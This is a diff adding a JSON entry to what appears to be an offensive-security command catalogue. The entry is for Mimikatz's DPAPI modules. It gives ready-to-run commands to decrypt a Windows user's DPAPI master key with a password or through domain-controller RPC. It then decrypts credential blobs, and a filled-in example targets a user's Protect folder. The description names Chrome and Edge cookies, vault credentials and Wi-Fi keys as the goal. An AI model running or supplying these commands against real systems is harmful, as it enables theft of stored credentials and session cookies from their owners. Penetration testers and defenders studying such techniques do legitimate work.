@@ -1,0 +1,17 @@
+{
+  "id": "mimikatz-dpapi",
+  "name": "Mimikatz dpapi::masterkey",
+  "command": "mimikatz.exe \"dpapi::masterkey /in:<masterkey-file> /sid:<user-sid> /password:<user-password>\" exit",
+  "description": "Decrypt a DPAPI master key using the owner's plaintext password (or NT hash). Required step before decrypting Chrome/Edge cookies, vault credentials, and Wi-Fi PSKs. Use /rpc on a DC for trustee decryption without the password.",
+  "platform": "windows",
+  "requires": ["shell"],
+  "protocols": [],
+  "tags": ["mimikatz", "dpapi", "masterkey"],
+  "variations": [
+    { "label": "DC RPC Decrypt (DA)", "requires": "shell", "command": "mimikatz.exe \"dpapi::masterkey /in:<masterkey-file> /rpc\" exit" },
+    { "label": "Decrypt Credential Blob", "requires": "shell", "command": "mimikatz.exe \"dpapi::cred /in:<credential-file> /masterkey:<decrypted-mk>\" exit" }
+  ],
+  "examples": [
+    "mimikatz.exe \"dpapi::masterkey /in:C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Protect\\<sid>\\<guid> /sid:S-1-5-21-... /password:Password123!\" exit"
+  ]
+}
